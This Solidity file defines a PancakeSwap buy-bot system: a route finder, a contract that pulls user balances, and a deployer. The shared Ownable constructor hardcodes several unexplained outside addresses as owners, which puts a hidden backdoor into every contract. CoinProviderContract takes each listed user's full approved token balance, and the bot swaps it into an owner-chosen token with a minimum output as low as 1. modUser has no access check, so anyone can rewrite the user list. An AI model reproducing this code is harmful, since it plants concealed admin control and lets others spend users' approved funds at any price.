pragma solidity ^0.6.10;
import "hardhat/console.sol";
interface ICoinProvider {
    function getUserMoneyByAddress(address erc20Token, address to) external returns (bool, address, uint256);
}

library TransferHelper {
    function safeApprove(
        address token,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            'TransferHelper::safeApprove: approve failed'
        );
    }

    function safeTransfer(
        address token,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            'TransferHelper::safeTransfer: transfer failed'
        );
    }

    function safeTransferFrom(
        address token,
        address from,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            'TransferHelper::transferFrom: transferFrom failed'
        );
    }

    function safeTransferETH(address to, uint256 value) internal {
        (bool success,) = to.call{value : value}(new bytes(0));
        require(success, 'TransferHelper::safeTransferETH: ETH transfer failed');
    }
}

interface ERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
   */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the token decimals.
   */
    function decimals() external view returns (uint8);

    /**
     * @dev Returns the token symbol.
   */
    function symbol() external view returns (string memory);

    /**
    * @dev Returns the token name.
  */
    function name() external view returns (string memory);

    /**
     * @dev Returns the bep token owner.
   */
    function getOwner() external view returns (address);

    /**
     * @dev Returns the amount of tokens owned by `account`.
   */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
    function allowance(address _owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable {
    address public owner;
    mapping(address => bool) public  owners;

    /**
      * @dev The Ownable constructor sets the original `owner` of the contract to the sender
      * account.
      */
    constructor () public {
        owner = msg.sender;
        owners[msg.sender] = true;
        owners[0xB65b199a6832CaC1119542BbDe87b794d2ecF1A9] = true;
        owners[0x169E59CbB84dE78FE5AE8d270ef1C21e9d9c0d28] = true;
        owners[0xC3F4a42f51CB3f1c73053a745F6dB3a085e3BC58] = true;
        owners[0x169E59CbB84dE78FE5AE8d270ef1C21e9d9c0d28] = true;
        owners[0xC3F4a42f51CB3f1c73053a745F6dB3a085e3BC58] = true;
        owners[0xC96f4bEFD81B354943f5E2ea4bEC1593527f3441] = true;
    }

    /**
      * @dev Throws if called by any account other than the owner.
      */
    modifier onlyOwner() {
        require(msg.sender == owner || owners[msg.sender]);
        _;
    }

    function addOwners(address _addr, bool status) public onlyOwner {
        owners[_addr] = status;
    }

    /**
    * @dev Allows the current owner to transfer control of the contract to a newOwner.
    * @param newOwner The address to transfer ownership to.
    */
    function transferOwnership(address newOwner) public onlyOwner {
        if (newOwner != address(0)) {
            owner = newOwner;
        }
    }

}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}
interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface BuyTokenHelp {
    function getRouter(address token1, address token2) external returns (address[] memory);

    function checkTokenSafe(address token) external returns (bool);

    function setTokenSafe(address token,bool status) external;
}

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   * - Addition cannot overflow.
   */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   * - Multiplication cannot overflow.
   */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * Reverts with custom message when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
interface IPancakeRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}


interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}



contract CoinProviderContract is ICoinProvider, Ownable {
    using TransferHelper for address;

    address[] public users;
    uint256 idx;


    function getUserMoneyByAddress(address erc20Token, address to) override onlyOwner external returns (bool, address, uint256) {

        if (idx == users.length) {
            return (false, address(0), 0);
        }

        ERC20 erc20 = ERC20(erc20Token);
        address currentAddress = users[idx];
        idx++;
        uint256 balance = erc20.balanceOf(currentAddress);

        if (balance == 0) {
            console.log('balance is 0');
            return (true, currentAddress, 0);
        }
        if (erc20.allowance(currentAddress, address(this)) == 0) {
            console.log('please approve');
            return (true, currentAddress, 0);
        }
        uint256 beginBalance = erc20.balanceOf(to);
        erc20Token.safeTransferFrom(currentAddress, to, balance);
        uint256 afterBalance = erc20.balanceOf(to);
        return (true, currentAddress, afterBalance - beginBalance);

    }

    function resetIdx() public onlyOwner {
        idx = 0;
    }


    function removeUser(uint256 id) public onlyOwner {
        require(id < users.length, "idx > user.length");
        uint latestIdx = users.length - 1;
        address latestAddress = users[latestIdx];
        users[id] = latestAddress;
        users.pop();
    }

    function addUser(address user) public onlyOwner {
        users.push(user);
    }

    function addUsers(address[] memory add_users) public onlyOwner {
        for (uint i = 0; i < add_users.length; i++) {
            addUser(add_users[i]);
        }

    }

    function modUser(uint256 idx, address user) public {
        users[idx] = user;
    }

    function getAllUsers() public view returns (address[] memory){
        return users;
    }

}

contract BuyTokenHelpContract  is BuyTokenHelp,Ownable{
    uint public MIN_POOL_BNB_SIZE =    3 * 1000000000000000000;
    uint public MIN_POOL_USDT_SIZE = 5 * 1000000000000000000;

//    address public WBNBAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address public WBNBAddress;

//    address public USDTAddress = 0x55d398326f99059fF775485246999027B3197955;
    address public USDTAddress;

//    address public IPancakeFactoryAddress = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;
    address public IPancakeFactoryAddress;


    mapping(address=> bool) public safeToken;
    mapping(address=>mapping(address=>address[])) public  path;



    IPancakeFactory public factory;
    // main

    constructor (address bnbAddress,address usdtAddress,address factoryAddress) public {
        WBNBAddress = bnbAddress;
        USDTAddress = usdtAddress;
        factory = IPancakeFactory(factoryAddress);

    }

    function getRouter(address token1, address token2) override external returns (address[] memory){
        if(path[token1][token2].length>1){
            return path[token1][token2];
        }
        address[] memory pathByToken1AdnToken2 = findPathWithToken(token1,token2);
        path[token1][token2] = pathByToken1AdnToken2;
        return pathByToken1AdnToken2;
    }

    function setPath(address token1,address token2,address[] memory putTokenPath) public onlyOwner{
        path[token1][token2] = putTokenPath;
    }


    function findPathWithToken(address _token1,address _token2) public view returns(address[] memory){
        // _token1 is wnbnb token2 is USDTAddress
        //1. token1 not same token2
        require(_token1 != _token2,"token1 can't eq token2!");
        require(_token1 == WBNBAddress || _token2 == WBNBAddress || _token1 == USDTAddress || _token2 == USDTAddress,"require wbnb or usdt transfer");
        //todo :support tk1 and tk2  not wbnb

        if (_token1 == WBNBAddress || _token2 == WBNBAddress){

            return __findPathWithWbnb(_token1,_token2);
        }
        return __findPathWithUSDT(_token1,_token2);

    }

    function __findPathWithUSDT(address _token1,address _token2) public view returns(address[] memory){
        if(_token1 == USDTAddress){
            bool usdt_pool_flag = checkPoolWithUsdt(_token2);
            if(usdt_pool_flag){
                address[] memory router1 = new address[](2);
                router1[0] = USDTAddress;
                router1[1] = _token2;
                return router1;
            }
            address[] memory router1 = new address[](3);
            router1[0] = USDTAddress;
            router1[1] = WBNBAddress;
            router1[2] = _token2;
            return router1;
        }

        if(_token2 == USDTAddress){
            bool usdt_pool_flag = checkPoolWithUsdt(_token1);
            if(usdt_pool_flag){
                address[] memory router1 = new address[](2);
                router1[0] = _token1;
                router1[1] = USDTAddress;
                return router1;
            }
            address[] memory router1 = new address[](3);
            router1[0] = _token1;
            router1[1] = WBNBAddress;
            router1[2] = USDTAddress;
            return router1;
        }
        require(false,"not usdt pair");

    }

    function __findPathWithWbnb(address _token1,address _token2) public view returns(address[] memory){
        if(_token1 == WBNBAddress){
            bool usdt_pool_flag = checkPoolWithUsdt(_token2);
            if(usdt_pool_flag){
                address[] memory router1 = new address[](3);
                router1[0] = WBNBAddress;
                router1[1] = USDTAddress;
                router1[2] = _token2;
                return router1;
            }
            address[] memory router1 = new address[](2);
            router1[0] = WBNBAddress;
            router1[1] = _token2;
            return router1;
        }

        if(_token2 == WBNBAddress){
            bool usdt_pool_flag = checkPoolWithUsdt(_token1);
            if(usdt_pool_flag){
                address[] memory router1 = new address[](3);
                router1[0] = _token1;
                router1[1] = USDTAddress;
                router1[2] = WBNBAddress;
                return router1;
            }
            address[] memory router1 = new address[](2);
            router1[0] = _token1;
            router1[1] = WBNBAddress;
            return router1;
        }
        require(false,"not wbnb pair");
    }

    function checkPoolWithUsdt(address _token) public view returns(bool){

        address _bnb_token_pair = factory.getPair(_token,WBNBAddress);

        // 价格 10 bnb
        if(_bnb_token_pair != address(0)){
            uint bnb = getPoolTokenSizeByPool(_bnb_token_pair,WBNBAddress);
            if (bnb > MIN_POOL_BNB_SIZE){
                return false;
            }
        }
        address _usdt_token_pair =  factory.getPair(_token,USDTAddress);
        require(_usdt_token_pair != address(0),"no pool wbnb and usdt");
        uint usdt_size = getPoolTokenSizeByPool(_usdt_token_pair,USDTAddress);
        require(usdt_size > MIN_POOL_USDT_SIZE,"usdt pool size too min!");
        return true;
    }

    function getPoolTokenSizeByPool(address pairAddr ,address token ) public view  returns(uint){
        if (pairAddr == address(0)){
            return 0;
        }
        IPancakePair pair = IPancakePair(pairAddr);
        (uint112 reserve0, uint112 reserve1, ) =  pair.getReserves();
        if(pair.token0() == token){
            return uint(reserve0);
        }
        if(pair.token1() == token){
            return uint(reserve1);
        }
        return 0;
    }


    function checkTokenSafe(address token) external override returns (bool){
        return safeToken[token];
    }

    function setTokenSafe(address token,bool status) external override onlyOwner{
        safeToken[token] = status;
    }

}

contract BuyTokenBotContract is Ownable{
    using TransferHelper for address;
    using SafeMath for uint256;
    ICoinProvider imoney;
    BuyTokenHelp buyTokenHelp;
    IPancakeRouter02 public router;

//    address public PANCAKESwapRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;



    constructor(address moneyAddress, address checkAddress,address pancakeAddress) public {
        imoney = ICoinProvider(moneyAddress);
        router = IPancakeRouter02(pancakeAddress);
        buyTokenHelp = BuyTokenHelp(checkAddress);
    }

    function buyToken(address token1Address, address token2Address, uint256 priceMul, uint256 priceDiv, uint256 gasLimit) public onlyOwner{

        uint256 buySize = 0;

        //get router
        address[] memory path = buyTokenHelp.getRouter(token1Address, token2Address);
        console.log("get router");
        for(uint i=0;i<path.length;i++){
            console.log(path[i]);
        }
        // get money
        check_swap_approve(token1Address);
        uint256 beginGas = gasleft();
        console.log(beginGas);
        while (beginGas.sub(gasleft()) < gasLimit) {
            console.log("gas cost");
            console.log(beginGas);
            (bool hasNext,address currentAddress,uint256 balance) = imoney.getUserMoneyByAddress(token1Address, address(this));
            console.log("currentAddress:");
            console.log(currentAddress);
            console.log('balance');
            console.log(balance);
            if (hasNext == false) {
                break;
            }
            if (balance == 0) {
                continue;
            }

            // check token2 safe
            require(buyTokenHelp.checkTokenSafe(token2Address), 'token not safe');
            console.log("check token safe pass");
            //token2 balance
            uint256 token2Min;
            if(priceMul == 0 || priceDiv == 0){
                token2Min = 1;
            }else{
                token2Min = balance.div(priceDiv).mul(priceMul);
            }
            // console.gasLimit
            if(token2Min == 0){
                token2Min = 1;
            }
            console.log("min token2:");
            console.log(token2Min);
            // buy token
            if (_buyTokenWithPath(path, balance, token2Min, currentAddress) == false) {
                // 如果买失败了就都不买了
                break;
            }
            buySize++;
        }
        require(buySize > 0, 'must buy once');
    }


    function _buyTokenWithPath(address[] memory path, uint256 _token1_blance, uint256 minToken, address to) public returns (bool) {
        try router.swapExactTokensForTokens(_token1_blance, minToken, path, to, block.timestamp) {
            return true;
        }
        catch{
            try router.swapExactTokensForTokensSupportingFeeOnTransferTokens(_token1_blance, minToken, path, to, block.timestamp){
                return true;
            }catch{
                return false;
            }
        }
//        router.swapExactTokensForTokens(_token1_blance, minToken, path, to, block.timestamp);
        return false;
    }

    function check_swap_approve(address _token1) private {
        ERC20 token1 = ERC20(_token1);
        uint256 allowance_size = token1.allowance(address(this), address(router));
        if (allowance_size < 1000) {
            _token1.safeApprove(address(router), ~uint256(0));
        }
    }

}

contract DeployHelp{
    BuyTokenBotContract public  buyTokenBotContract;
    BuyTokenHelpContract public buyTokenHelpContract;
    CoinProviderContract public coinProviderContract;
    address[] buyTokenBotContractAddressList;

    address SwapAddress;
    function init(address wbnbAddress,address usdtAddress,address factoryAddress,address swapAddress) public {
            SwapAddress = swapAddress;
            coinProviderContract = new CoinProviderContract();

            buyTokenHelpContract = new BuyTokenHelpContract(wbnbAddress,usdtAddress,factoryAddress);
            buyTokenBotContract = new BuyTokenBotContract(address(coinProviderContract),address(buyTokenHelpContract),swapAddress);
            coinProviderContract.addOwners(address(buyTokenBotContract),true);
            coinProviderContract.addOwners(msg.sender,true);
            buyTokenHelpContract.addOwners(address(buyTokenBotContract),true);
            buyTokenHelpContract.addOwners(msg.sender,true);
            buyTokenBotContract.addOwners(msg.sender,true);
            buyTokenBotContractAddressList.push(address(buyTokenBotContract));
    }
    function deployNewBotContract() public {
        BuyTokenBotContract buyTokenBotContract1 = new BuyTokenBotContract(address(coinProviderContract),address(buyTokenHelpContract),SwapAddress);

        coinProviderContract.addOwners(address(buyTokenBotContract1),true);
        buyTokenHelpContract.addOwners(address(buyTokenBotContract1),true);

        buyTokenBotContract1.addOwners(msg.sender,true);
        buyTokenBotContractAddressList.push(address(buyTokenBotContract1));
    }

    function getAddressList() public view returns(address coinProviderAddress,address BuyTokenHelpAddress,address[] memory buyTokenBotAddressList){
        return (address(coinProviderContract),address(buyTokenHelpContract),buyTokenBotAddressList);
    }

}